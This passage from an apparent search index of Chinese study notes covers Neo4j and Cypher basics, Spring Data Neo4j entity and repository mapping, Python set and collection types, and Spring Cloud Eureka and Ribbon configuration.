<p>\u8def\u5f84\uff1a\u8282\u70b9\u548c\u5173\u7cfb\u7684\u5e8f\u5217\uff0c\u7528\u4e8e\u63cf\u8ff0\u56fe\u5f62\u4e2d\u7684\u4e00\u4e2a\u901a\u8def\u6216\u8005\u8def\u5f84</p> </li> <li> <p>\u96c6\u5408\uff08\u4e0d\u80fd\u88ab\u5f53\u505a\u5c5e\u6027\u5b58\u50a8\uff0c\u80fd\u4f5c\u4e3a\u53c2\u6570\u8f93\u5165\u548c\u8fd4\u56de\uff09</p> </li> </ol>"},{"location":"Record%26Review/Neo4J%E4%BD%BF%E7%94%A8/#_6","title":"\u547d\u540d\u89c4\u8303","text":"<ul> <li>\u80fd\u5305\u542b\u975e\u82f1\u6587\u5b57\u7b26\uff08\u4e2d\u6587\uff0c\u5e0c\u814a\u5b57\u7b26\u7b49\uff09</li> <li>\u4e0d\u80fd\u6570\u5b57\u5f00\u5934</li> <li>\u4e0d\u80fd\u8d85\u51fa65534\u4e2a\u5b57\u7b26</li> <li>\u533a\u5206\u5927\u5c0f\u5199</li> <li>\u8282\u70b9\u6807\u7b7e\u5efa\u8bae\u9996\u5b57\u6bcd\u5927\u5199\uff08VehicleOwner\uff09</li> <li>\u5173\u7cfb\u7c7b\u578b\u5efa\u8bae\u5168\u5927\u5199\uff08OWNS_VEHICLE\uff09</li> </ul>"},{"location":"Record%26Review/Neo4J%E4%BD%BF%E7%94%A8/#_7","title":"\u5e38\u89c4\u8868\u8fbe\u5f0f\u5199\u6cd5","text":"<p>\u53ef\u53c2\u8003Expressions - Cypher Manual (neo4j.com)</p> <p>\u603b\u4f53\u4e0b\u6765\u611f\u89c9\u548cMYSQL\u5dee\u4e0d\u591a\uff0c\u503c\u5f97\u6ce8\u610f\u7684\u662f\u5b83\u652f\u6301\u52a8\u6001\u5c5e\u6027\uff0c\u4f8b\u5982<code>obj['prop']</code>\uff0c\u7b49\u6548\u4e8e<code>obj.prop</code>\u3002\u540c\u65f6\u53c2\u6570\u9700\u8981\u52a0\u4e0a<code>$</code>\u7b26\u53f7</p>"},{"location":"Record%26Review/Neo4J%E4%BD%BF%E7%94%A8/#_8","title":"\u8bed\u6cd5","text":"<p>w3school\u4e0a\u9762\u6709\u6559\u7a0bNeo4j - CQL\u7b80\u4ecb_w3cschool</p> <p>\u4f46\u662f\u8fd9\u4e2a\u91cc\u9762\u7684\u5efa\u7acb\u7d22\u5f15\u7684\u8bed\u53e5\u5df2\u7ecf\u8fc7\u65f6\uff0c\u5176\u4ed6\u8fd8\u6ca1\u9a8c\u8bc1\u3002\u4e5f\u53ef\u4ee5\u5c1d\u8bd5\u770b\u5b98\u65b9\u6587\u6863</p> <p>Introduction - Cypher Manual (neo4j.com)</p>"},{"location":"Record%26Review/Neo4J%E4%BD%BF%E7%94%A8/#springdataneo4j","title":"SpringData\u4e2d\u7684Neo4J","text":""},{"location":"Record%26Review/Neo4J%E4%BD%BF%E7%94%A8/#maven","title":"Maven\u4f9d\u8d56","text":"<pre><code>&lt;dependency&gt;\n    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\n    &lt;artifactId&gt;spring-boot-starter-data-neo4j&lt;/artifactId&gt;\n&lt;/dependency&gt;\n</code></pre> <p>\u4e5f\u53ef\u4ee5\u4f7f\u7528stater\u5feb\u901f\u751f\u6210\u3002\u5728SpringData\u4e2d\u542b\u6709Neo4J\u7684\u6269\u5c55\u9009\u9879\u3002</p>"},{"location":"Record%26Review/Neo4J%E4%BD%BF%E7%94%A8/#_9","title":"\u914d\u7f6e","text":"<pre><code>spring:\n    neo4j:\n        uri: bolt://localhost:7687\n        authentication:\n            username: neo4j\n            password: pwd\n</code></pre> <p>\u4e5f\u53ef\u4ee5\u4f7f\u7528\u914d\u7f6e\u7c7b\u914d\u7f6e</p> <pre><code>@Bean\nConfiguration cypherDslConfiguration() {\n    return Configuration.newConfig()\n                .withDialect(Dialect.NEO4J_5).build();\n}\n</code></pre>"},{"location":"Record%26Review/Neo4J%E4%BD%BF%E7%94%A8/#_10","title":"\u8282\u70b9\u6620\u5c04","text":"<p>\u53ef\u53c2\u8003Metadata-based Mapping :: Spring Data Neo4j</p> <pre><code>import java.util.ArrayList;\nimport java.util.List;\n\nimport org.springframework.data.neo4j.core.schema.Id;\nimport org.springframework.data.neo4j.core.schema.Node;\nimport org.springframework.data.neo4j.core.schema.Property;\nimport org.springframework.data.neo4j.core.schema.Relationship;\nimport org.springframework.data.neo4j.core.schema.Relationship.Direction;\n\n@Node(\"Movie\") // \u6807\u8bb0\u5b9e\u4f53\u662fNeo4J\u7684\u5b9e\u4f53\u6620\u5c04\u5bf9\u8c61\npublic class MovieEntity {\n\n    @Id // \u5fc5\u987b\u8981\u6709\uff0c\u53ef\u4ee5\u914d\u7f6e\u751f\u6210\u552f\u4e00id,\u89c1@GeneratedValue\uff0c\u4e00\u822c\u4e0d\u5141\u8bb8\u6539\u53d8\n    private final String title;\n\n    @Property(\"tagline\") // \u5bf9\u8c61\u7684\u5c5e\u6027\u6807\u7b7e\uff0c\u53ef\u4ee5\u7701\u7565\n    private final String description;\n\n    @Relationship(type = \"ACTED_IN\", direction = Direction.INCOMING) // \u5173\u7cfb\u58f0\u660e\uff0ctype\u662f\u5bf9\u4e8e\u5173\u7cfb\u81ea\u5b9a\u4e49\u7684\u6807\u7b7e\uff0c\u6ce8\u610f\u547d\u540d\u89c4\u8303\n    private List&lt;Roles&gt; actorsAndRoles;\n\n    @Relationship(type = \"DIRECTED\", direction = Direction.INCOMING)\n    private List&lt;PersonEntity&gt; directors = new ArrayList&lt;&gt;();\n\n    public MovieEntity(String title, String description) { \n        this.title = title;\n        this.description = description;\n    }\n\n    // Getters omitted for brevity\n}\n</code></pre>"},{"location":"Record%26Review/Neo4J%E4%BD%BF%E7%94%A8/#_11","title":"\u5173\u7cfb\u6620\u5c04","text":"<pre><code>@RelationshipProperties\npublic class Roles {\n\n    @RelationshipId\n    private Long id;\n\n    private final List&lt;String&gt; roles;\n\n    @TargetNode\n    private final PersonEntity person;\n\n    public Roles(PersonEntity person, List&lt;String&gt; roles) {\n        this.person = person;\n        this.roles = roles;\n    }\n\n    public List&lt;String&gt; getRoles() {\n        return roles;\n    }\n}\n</code></pre> <pre><code>@Relationship(type = \"ACTED_IN\", direction = Direction.INCOMING)\nprivate List&lt;Roles&gt; actorsAndRoles;\n</code></pre> <p>\u7528\u4f8b\uff1a</p> <p>Metadata-based Mapping :: Spring Data Neo4j</p>"},{"location":"Record%26Review/Neo4J%E4%BD%BF%E7%94%A8/#_12","title":"\u6620\u5c04\u7c7b\uff08\u63a5\u53e3\uff09","text":"<p>\u6620\u5c04\u63a5\u53e3\u4e00\u822c\u662f\u7ee7\u627f<code>Repository&lt;T,ID&gt;</code>\u63a5\u53e3\u7684\uff0c\u7136\u540e\u901a\u8fc7Spring\u4ee3\u7406\u6ce8\u5165\u4f7f\u7528</p> <p>SpringData\u63d0\u4f9b\u4e86\u4e00\u4e9b\u5df2\u7ecf\u5b9e\u73b0\u597d\u7684\u63a5\u53e3\uff0c\u5e38\u7528\u7684\u6bd4\u5982Crud\u63a5\u53e3</p> <pre><code>public interface CrudRepository&lt;T, ID&gt; extends Repository&lt;T, ID&gt; {\n\n  &lt;S extends T&gt; S save(S entity);\n\n  Optional&lt;T&gt; findById(ID primaryKey);\n\n  Iterable&lt;T&gt; findAll();\n\n  long count();\n\n  void delete(T entity);\n\n  boolean existsById(ID primaryKey);\n\n  // \u2026 more functionality omitted.\n}\n</code></pre> <p>\u5f53\u7136\u5bf9\u4e8e\u67e5\u8be2\u7ed3\u679c\u4e5f\u53ef\u4ee5\u5206\u9875\u4f7f\u7528</p> <pre><code>public interface PagingAndSortingRepository&lt;T, ID&gt;  {\n\n  Iterable&lt;T&gt; findAll(Sort sort);\n\n  Page&lt;T&gt; findAll(Pageable pageable);\n}\n</code></pre> <pre><code>PagingAndSortingRepository&lt;User, Long&gt; repository = // \u2026 get access to a bean\nPage&lt;User&gt; users = repository.findAll(PageRequest.of(1, 20));\n</code></pre> <p>\u6211\u4eec\u4e5f\u53ef\u4ee5\u81ea\u5df1\u5b9a\u4e49\u4e00\u4e9b\u63a5\u53e3\u5e76\u4e14\u81ea\u5df1\u5b9e\u73b0</p> <pre><code>interface UserRepository extends CrudRepository&lt;User, Long&gt; {\n    @Query(\"MATCH (n:User {lastname: $lastname}) RETURN n\")\n  long countByLastname(@Param(\"lastname\")String lastname);\n}\n</code></pre> <p>\u5982\u679c\u60f3\u8981Spring\u4ee3\u7406\u6ce8\u5165\u7684\u8bdd\uff0c\u9700\u8981\u5728\u914d\u7f6e\u7c7b\u4e0a\u52a0\u4e0a\u6ce8\u89e3<code>@EnableNeo4JRepositories</code>\uff0c\u7136\u540e\u5c31\u53ef\u4ee5\u5728\u4e0b\u9762\u7684\u7c7b\u4e2d\u6ce8\u5165\u4f7f\u7528\u4e86</p> <pre><code>class SomeClient {\n\n  private final UserRepository repository;\n\n  SomeClient(UserRepository repository) {\n    this.repository = repository;\n  }\n\n  void doSomething() {\n    List&lt;User&gt; users = repository.findByLastname(\"Matthews\");\n  }\n}\n</code></pre> <p>\u4e5f\u53ef\u4ee5\u901a\u8fc7java\u4ee3\u7801\u7684\u65b9\u5f0f\u81ea\u5b9a\u4e49\u5b58\u653e\u8fc7\u7a0b</p> <p>Example1:</p> <pre><code>interface HumanRepository {\n  void someHumanMethod(User user);\n}\n\nclass HumanRepositoryImpl implements HumanRepository {\n\n  public void someHumanMethod(User user) {\n    // Your custom implementation\n  }\n}\n\ninterface ContactRepository {\n\n  void someContactMethod(User user);\n\n  User anotherContactMethod(User user);\n}\n\nclass ContactRepositoryImpl implements ContactRepository {\n\n  public void someContactMethod(User user) {\n    // Your custom implementation\n  }\n\n  public User anotherContactMethod(User user) {\n    // Your custom implementation\n  }\n}\n</code></pre> <p>Examp</p> <pre><code>interface CustomizedSave&lt;T&gt; {\n  &lt;S extends T&gt; S save(S entity);\n}\n\nclass CustomizedSaveImpl&lt;T&gt; implements CustomizedSave&lt;T&gt; {\n\n  public &lt;S extends T&gt; S save(S entity) {\n    // Your custom implementation\n  }\n}\n</code></pre>"},{"location":"Record%26Review/Python%E4%B8%AD%E7%9A%84%E9%9B%86%E5%90%88%E8%BF%90%E7%AE%97%E7%AC%A6/","title":"Python\u96c6\u5408\u8fd0\u7b97\u7b26","text":""},{"location":"Record%26Review/Python%E4%B8%AD%E7%9A%84%E9%9B%86%E5%90%88%E8%BF%90%E7%AE%97%E7%AC%A6/#python","title":"Python\u4e2d\u7684\u96c6\u5408\u8fd0\u7b97\u7b26","text":"\u540d\u79f0 \u8fd0\u7b97\u7b26 \u8bf4\u660e \u4ea4\u96c6 &amp; a&amp;b\uff0c\u53d6a,b\u96c6\u5408\u7684\u516c\u5171\u96c6\u5408 \u5e76\u96c6 | a|b\uff0c\u53d6a,b\u96c6\u5408\u7684\u6240\u6709\u5143\u7d20 \u5dee\u96c6 - a-b\uff0ca\u4e2d\u542b\u6709\u800cb\u4e2d\u6ca1\u6709\u7684\u5143\u7d20 \u5bf9\u79f0\u5dee\u96c6 ^ a^b,\u6c42\u975e\u5171\u6709\u90e8\u5206\u7684\u96c6\u5408\uff0c\u76f8\u5f53\u4e8e(a|b)-(a&amp;b)"},{"location":"Record%26Review/Python%E4%B8%AD%E7%9A%84%E9%9B%86%E5%90%88%E8%BF%90%E7%AE%97%E7%AC%A6/#python_1","title":"Python\u4e2d\u7684\u6570\u636e\u96c6","text":"\u540d\u79f0 \u7528\u6cd5 \u7279\u70b9 \u96c6\u5408set set = \u96c6\u5408\u4e2d\u4e0d\u4f1a\u51fa\u73b0\u91cd\u590d\u5143\u7d20\uff0c\u96c6\u5408\u672c\u8eab\u4f1a\u5bf9\u96c6\u5408\u5185\u5143\u7d20\u53bb\u91cd\uff0c\u8f93\u51fa\u65f6\u4e5f\u4f1a\u201d\u6392\u5e8f\u201c \u5b57\u5178dict dict = \u5b57\u5178\u672c\u8eab\u5176\u5b9e\u662f\u952e\u503c\u5bf9\u7684\u96c6\u5408\uff0c\u4e0d\u5141\u8bb8\u952e\u91cd\u590d\uff0c\u4f46\u662f\u503c\u53ef\u4ee5\u91cd\u590d\uff0c\u952e\u5fc5\u987b\u662f\u5b57\u7b26\u4e32\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0c\u5b57\u5178\u548c\u5176\u4ed6\u6570\u636e\u96c6\u4e0d\u540c\uff0c\u4ed6\u53ea\u53ef\u4ee5\u901a\u8fc7\u952e\u8bbf\u95ee \u5217\u8868list list  =  [1,2,\"hello\"] \u5217\u8868\u662f\u4e00\u4e2a\u6570\u636e\u96c6\uff0c\u6ca1\u6709\u4efb\u4f55\u7684\u9650\u5236\uff0c\u53ef\u4ee5\u91cd\u590d\uff0c\u53ef\u4ee5\u7c7b\u578b\u4e0d\u4e00 \u5143\u7ec4 var = (1,2,3,\u201dhello\u201d) \u5143\u7ec4\u548c\u96c6\u5408\u7684\u5b9a\u4e49\u89c4\u5219\u76f8\u4f3c\uff0c\u4f46\u662f\u5143\u7ec4\u4e00\u65e6\u5b9a\u4e49\u4e4b\u540e\u4fbf\u65e0\u6cd5\u66f4\u6539"},{"location":"Record%26Review/Spring%20Cloud/","title":"Spring Cloud","text":""},{"location":"Record%26Review/Spring%20Cloud/#spring-cloud_1","title":"spring cloud\u4e2d\u7684\u4e00\u4e9b\u6280\u672f\u548c\u5206\u7c7b","text":"<ul> <li>\u6d88\u606f\u961f\u5217\uff1a</li> <li>Kafka</li> <li>RabbitMQ</li> <li> <p>ActiveMQ</p> </li> <li> <p>\u6ce8\u518c\u4e2d\u5fc3\uff1a</p> </li> <li> <p>Eureka</p> </li> <li> <p>Nacos</p> </li> <li> <p>Consul </p> </li> <li> <p>Zookeeper</p> </li> <li> <p>Dubbo</p> </li> <li> <p>\u6570\u636e\u8fde\u63a5\u6c60</p> </li> <li> <p>C3P0</p> </li> <li> <p>DBCP</p> </li> <li> <p>HiKariCP</p> </li> <li> <p>Druid</p> </li> <li> <p>\u6570\u636e\u6301\u4e45\u5316</p> </li> <li>\u5173\u7cfb\u578b\u6570\u636e\u5e93<ul> <li>MySql</li> <li>Oracle</li> <li>SQLite</li> </ul> </li> <li>\u975e\u5173\u7cfb\u578b\u6570\u636e\u5e93<ul> <li>\u200b   Redis</li> <li>MongoDB</li> </ul> </li> <li> <p>\u6301\u4e45\u5316\u6846\u67b6</p> <ul> <li>Hibernate</li> <li>JPA</li> <li>MyBatis</li> <li>JOQO</li> </ul> </li> <li> <p>\u5e38\u89c1\u5b89\u5168\u6846\u67b6</p> </li> <li> <p>Spring Security</p> </li> <li> <p>Shiro</p> </li> <li> <p>\u5e38\u89c1\u670d\u52a1\u5668</p> </li> <li> <p>Tomcat</p> </li> <li> <p>nginx</p> </li> <li> <p>Apache\uff08\u6ce8\u610f\u533a\u522bTomcat\uff0c\u90fd\u662fApache\u57fa\u91d1\u4f1a\u5f00\u53d1\u7684\uff0c\u4f46Apache\u662fweb\u670d\u52a1\u5668\uff08\u9759\u6001\u89e3\u6790\uff0c\u5982HTML\uff09\uff0ctomcat\u662fjava\u5e94\u7528\u670d\u52a1\u5668\uff0c\u52a8\u6001\u89e3\u6790\uff08\u5982JSP\uff09\u3002Tomcat\u53ea\u662f\u4e00\u4e2aservlet(jsp\u4e5f\u7ffb\u8bd1\u6210servlet)\u5bb9\u5668\uff0c\u53ef\u4ee5\u8ba4\u4e3a\u662fapache\u7684\u6269\u5c55\uff0c\u4f46\u662f\u53ef\u4ee5\u72ec\u7acb\u4e8eapache\u8fd0\u884c</p> </li> <li> <p>\u9875\u9762\u6e32\u67d3</p> </li> <li> <p>Vue</p> </li> <li> <p>thymeleaf</p> </li> <li> <p>React</p> </li> </ul>"},{"location":"Record%26Review/Spring%20Cloud/#eureka","title":"Eureka\u6ce8\u518c\u4e2d\u5fc3","text":""},{"location":"Record%26Review/Spring%20Cloud/#_1","title":"\u57fa\u672c\u914d\u7f6e","text":"<ol> <li>Eureka\u6ce8\u518c\u4e2d\u5fc3\u7684pom.xml</li> </ol> <pre><code>&lt;dependency&gt;\n    &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;\n    &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-server&lt;/artifactId&gt;\n&lt;/dependency&gt;\n</code></pre> <p>\u200b   2.Eureka\u6ce8\u518c\u4e2d\u5fc3\u7684application.yml</p> <pre><code># Eureka\u6ce8\u518c\u4e2d\u5fc3\u914d\u7f6e\nserver:\n    port: 10086 # \u7aef\u53e3\n# \u6ce8\u518c\u4fe1\u606f\nspring:\n    application:\n        name: eurekaserver # \u670d\u52a1\u540d\u79f0,\u5927\u5c0f\u5199\u654f\u611f\neureka:\n    client:\n        service-url:\n            defaultZone: http://127.0.0.1:10086/eureka # \u670d\u52a1\u5730\u5740\n</code></pre> <ol> <li>Eureka\u6ce8\u518c\u4e2d\u5fc3\u9700\u8981\u5728\u914d\u7f6e\u7c7b\u4e0a\u52a0\u4e0a<code>@EnableEurekaServer</code>\u6ce8\u89e3</li> <li>\u5fae\u670d\u52a1\u7684pom.xml</li> </ol> <pre><code>&lt;dependency&gt;\n    &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;\n    &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt;\n&lt;/dependency&gt;\n&lt;!--  \u4e0b\u9762\u8fd9\u4e2a\u914d\u7f6e\u975e\u5e38\u91cd\u8981\uff0c\u5982\u679c\u6ca1\u6709\u4f1a\u62a5\u9519\nField optionalArgs in org.springframework.cloud.netflix.eureka.EurekaClientAutoConfiguration$RefreshableEurekaClientConfiguration required a bean of type 'com.netflix.discovery.AbstractDiscoveryClientOptionalArgs' that could not be found.\n=======================\n\u6211\u4eec\u5176\u5b9e\u4e5f\u53ef\u4ee5\u5728\u4f7f\u7528Spring Initializer\u7684\u65f6\u5019\u5427Spring Web\u548cEureka Discovery Client\u52fe\u9009\u4e0a\uff0c\u8fd9\u79cd\u65b9\u5f0f\u66f4\u52a0\u65b9\u4fbf\u3002\n--&gt;\n&lt;dependencyManagement&gt;\n    &lt;dependencies&gt;\n        &lt;dependency&gt;\n            &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;\n            &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt;\n            &lt;version&gt;${spring-cloud.version}&lt;/version&gt;\n            &lt;type&gt;pom&lt;/type&gt;\n            &lt;scope&gt;import&lt;/scope&gt;\n        &lt;/dependency&gt;\n    &lt;/dependencies&gt;\n&lt;/dependencyManagement&gt;\n</code></pre> <ol> <li>\u5fae\u670d\u52a1\u7684application.yml</li> </ol> <pre><code># \u6ce8\u518c\u4fe1\u606f\nspring:\n    application:\n        name: userservice # \u670d\u52a1\u540d\u79f0\neureka:\n    client:\n        service-url:\n            defaultZone: http://127.0.0.1:10086/eureka # \u670d\u52a1\u5730\u5740\n</code></pre>"},{"location":"Record%26Review/Spring%20Cloud/#pomxml","title":"\u5907\u4efd<code>pom.xml</code>\uff0c\u4ee5\u9632\u540e\u60a3\uff1a","text":"<ul> <li>\u670d\u52a1\u7aef\uff1a</li> </ul> <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;project xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n    xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd\"&gt;\n    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;\n    &lt;parent&gt;\n        &lt;groupId&gt;com.leotan&lt;/groupId&gt;\n        &lt;artifactId&gt;SpringCloudDemo&lt;/artifactId&gt;\n        &lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt;\n    &lt;/parent&gt;\n    &lt;groupId&gt;com.leotan&lt;/groupId&gt;\n    &lt;artifactId&gt;UserService&lt;/artifactId&gt;\n    &lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt;\n    &lt;name&gt;UserService&lt;/name&gt;\n    &lt;description&gt;UserService&lt;/description&gt;\n    &lt;properties&gt;\n        &lt;java.version&gt;17&lt;/java.version&gt;\n        &lt;spring-cloud.version&gt;2022.0.3&lt;/spring-cloud.version&gt;\n    &lt;/properties&gt;\n    &lt;dependencies&gt;\n        &lt;dependency&gt;\n            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\n            &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;\n        &lt;/dependency&gt;\n        &lt;dependency&gt;\n            &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;\n            &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt;\n        &lt;/dependency&gt;\n        &lt;dependency&gt;\n            &lt;groupId&gt;org.projectlombok&lt;/groupId&gt;\n            &lt;artifactId&gt;lombok&lt;/artifactId&gt;\n            &lt;optional&gt;true&lt;/optional&gt;\n        &lt;/dependency&gt;\n        &lt;dependency&gt;\n            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\n            &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt;\n        &lt;/dependency&gt;\n    &lt;/dependencies&gt;\n    &lt;dependencyManagement&gt;\n        &lt;dependencies&gt;\n            &lt;dependency&gt;\n                &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;\n                &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt;\n                &lt;version&gt;${spring-cloud.version}&lt;/version&gt;\n                &lt;type&gt;pom&lt;/type&gt;\n                &lt;scope&gt;import&lt;/scope&gt;\n            &lt;/dependency&gt;\n        &lt;/dependencies&gt;\n    &lt;/dependencyManagement&gt;\n    &lt;build&gt;\n        &lt;plugins&gt;\n            &lt;plugin&gt;\n                &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\n                &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;\n                &lt;configuration&gt;\n                    &lt;excludes&gt;\n                        &lt;exclude&gt;\n                            &lt;groupId&gt;org.projectlombok&lt;/groupId&gt;\n                            &lt;artifactId&gt;lombok&lt;/artifactId&gt;\n                        &lt;/exclude&gt;\n                    &lt;/excludes&gt;\n                &lt;/configuration&gt;\n            &lt;/plugin&gt;\n        &lt;/plugins&gt;\n    &lt;/build&gt;\n&lt;/project&gt;\n</code></pre> <ul> <li>\u6ce8\u518c\u4e2d\u5fc3</li> </ul> <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;project xmlns=\"http://maven.apache.org/POM/4.0.0\"\n         xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n         xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\"&gt;\n    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;\n\n    &lt;groupId&gt;com.leotan&lt;/groupId&gt;\n    &lt;artifactId&gt;EurekaServer&lt;/artifactId&gt;\n    &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;\n    &lt;parent&gt;\n        &lt;groupId&gt;com.leotan&lt;/groupId&gt;\n        &lt;artifactId&gt;SpringCloudDemo&lt;/artifactId&gt;\n        &lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt;\n    &lt;/parent&gt;\n\n    &lt;dependencies&gt;\n        &lt;dependency&gt;\n            &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;\n            &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-server&lt;/artifactId&gt;\n        &lt;/dependency&gt;\n        &lt;dependency&gt;\n            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\n            &lt;artifactId&gt;spring-boot-autoconfigure&lt;/artifactId&gt;\n        &lt;/dependency&gt;\n    &lt;/dependencies&gt;\n\n&lt;/project&gt;\n</code></pre>"},{"location":"Record%26Review/Spring%20Cloud/#_2","title":"\u4f7f\u7528","text":"<ol> <li>\u914d\u7f6eRestTemplate</li> </ol> <pre><code>@Bean\n@LoadBalanced //\u8d1f\u8f7d\u5747\u8861\u7684\u6ce8\u89e3\uff0c\u8fd9\u91cc\u9ed8\u8ba4 \u4f7f\u7528\u7684\u662fRibbon\npublic RestTemplate restTemplate(){\n    return new RestTemplate();\n}\n</code></pre> <ol> <li>\u8fdc\u7a0b\u8c03\u7528\u670d\u52a1</li> </ol> <pre><code>@AutoWired\nprivate RestTemplate restTemplate;\n\npublic Entity queryEntityById(Long id){\n    String url = \"http://userservice/\" + id;\n    Entity e = restTemplate.getForObject(url,Entity.class);\n    return e;\n}\n\n@GetMapping(\"/{id}\")\npublic Entity getById(@PathVariable Long id){\n    return mapper.getById(id);\n}\n</code></pre> <ol> <li> <p>\u8d1f\u8f7d\u5747\u8861</p> </li> <li> <p>\u539f\u7406\uff1a</p> <ul> <li><code>LoadBalancerInterceptor</code>\u62e6\u622a\u8bf7\u6c42</li> <li><code>DynamicServerListLoadBalancer</code>\u4eceEureka\u6ce8\u518c\u4e2d\u5fc3\u67e5\u8be2\u670d\u52a1\u5730\u5740\u5217\u8868</li> <li><code>IRule</code>\u4ece\u5217\u8868\u9009\u62e9\u4e00\u4e2a\u670d\u52a1\u5730\u5740\u4f5c\u4e3a\u8bf7\u6c42\u5730\u5740\u8fd4\u56de</li> <li><code>LoadBalancerInterceptor</code>\u5c06\u539f\u5730\u5740\u66ff\u6362</li> </ul> </li> <li> <p>IRule\u7684\u5e38\u89c1\u5b9e\u73b0</p> \u89c4\u5219\u540d\u79f0 \u7279\u70b9 AvailabilityFilteringRule \u8fc7\u6ee4\u6389\u4e00\u76f4\u8fde\u63a5\u5931\u8d25\u7684\u88ab\u6807\u8bb0\u4e3acircuit tripped\uff08\u7535\u8def\u8df3\u95f8\uff09\u7684\u540e\u7aefService\uff0c\u5e76\u8fc7\u6ee4\u6389\u90a3\u4e9b\u9ad8\u5e76\u53d1\u7684\u540e\u7aefServer\u6216\u8005\u4f7f\u7528\u4e00\u4e2aAvailabilityPredicate\u6765\u5305\u542b\u8fc7\u6ee4Server\u7684\u903b\u8f91\uff0c\u5176\u5b9e\u5c31\u662f\u68c0\u67e5status\u7684\u8bb0\u5f55\u7684\u5404\u4e2aServer\u7684\u8fd0\u884c\u72b6\u6001 BestAvailableRule \u9009\u62e9\u4e00\u4e2a\u6700\u5c0f\u7684\u5e76\u53d1\u8bf7\u6c42\u7684Server\uff0c\u9010\u4e2a\u8003\u5bdfServer\uff0c\u5982\u679cServer\u88abtripped\u4e86\uff0c\u5219\u8df3\u8fc7 RandomRule \u968f\u673a\u9009\u62e9\u4e00\u4e2aServer ResponseTimeWeightedRule \u5df2\u5e9f\u5f03\uff0c\u4f5c\u7528\u540cWeightedResponseTimeRule RetryRule \u5bf9\u9009\u5b9a\u7684\u8d1f\u8d23\u5747\u8861\u7b56\u7565\u673a\u4e0a\u5145\u503c\u673a\u5236\uff0c\u5728\u4e00\u4e2a\u914d\u7f6e\u65f6\u95f4\u6bb5\u5185\u5f53\u9009\u62e9Server\u4e0d\u6210\u529f\uff0c\u5219\u4e00\u76f4\u5c1d\u8bd5\u4f7f\u7528subRule\u7684\u65b9\u5f0f\u9009\u62e9\u4e00\u4e2a\u53ef\u7528\u7684Server RoundRobinRule \u8f6e\u8be2\u9009\u62e9\uff0c\u8f6e\u8be2index\uff0c\u9009\u62e9index\u5bf9\u5e94\u4f4d\u7f6eServer WeightedResponseTimeRule \u6839\u636e\u76f8\u5e94\u65f6\u95f4\u52a0\u6743\uff0c\u76f8\u5e94\u65f6\u95f4\u8d8a\u957f\uff0c\u6743\u91cd\u8d8a\u5c0f\uff0c\u88ab\u9009\u4e2d\u7684\u53ef\u80fd\u6027\u8d8a\u4f4e ZoneAvoidanceRule \uff08\u9ed8\u8ba4\u662f\u8fd9\u4e2a\uff09\u8d1f\u8d23\u5224\u65adServer\u6240Zone\u7684\u6027\u80fd\u548cServer\u7684\u53ef\u7528\u6027\u9009\u62e9Server\uff0c\u5728\u6ca1\u6709Zone\u7684\u73af\u5883\u4e0b\uff0c\u7c7b\u4f3c\u4e8e\u8f6e\u8be2\uff08RoundRobinRule\uff09 </li> <li> <p>IRule\u7684\u914d\u7f6e</p> <ul> <li> <p>\u4ee3\u7801\u65b9\u5f0f\uff1a\u6d88\u8d39\u8005\u670d\u52a1\u4e2d\u5b9a\u4e49\u4e00\u4e2a\u65b0\u7684<code>IRule</code>,\u8fd9\u79cd\u65b9\u5f0f\u7684\u914d\u7f6e\u4f1a\u5f71\u54cd\u8be5\u6d88\u8d39\u8005\u7684\u6240\u6709\u8d1f\u8f7d\u5747\u8861\u7b56\u7565\u3002</p> <pre><code>@Bean\npublic IRule randomRule(){\n    return new RandomRule();\n}\n</code></pre> </li> <li> <p>\u914d\u7f6e\u6587\u4ef6\u65b9\u5f0f\uff1a\u5728\u6d88\u8d39\u8005\u670d\u52a1\u7684\u914d\u7f6e\u6587\u4ef6\u4e2d\u52a0\u5165\u4ee5\u4e0a\u4ee3\u7801\uff0c\u5bf9userservice\u670d\u52a1\u7684\u8c03\u7528\u5355\u72ec\u914d\u7f6e</p> <pre><code>userservice: # \u83ab\u76ee\u6807\u670d\u52a1\n    ribbon:\n        NFLoadBalancerRuleClassName: com.netflix.loadbalancer.RandomRule # \u8d1f\u8f7d\u5747\u8861\u7684\u5b9e\u73b0\u7c7b\u7684\u552f\u4e00\u5750\u6807\n</code></pre> </li> </ul> </li> <li> 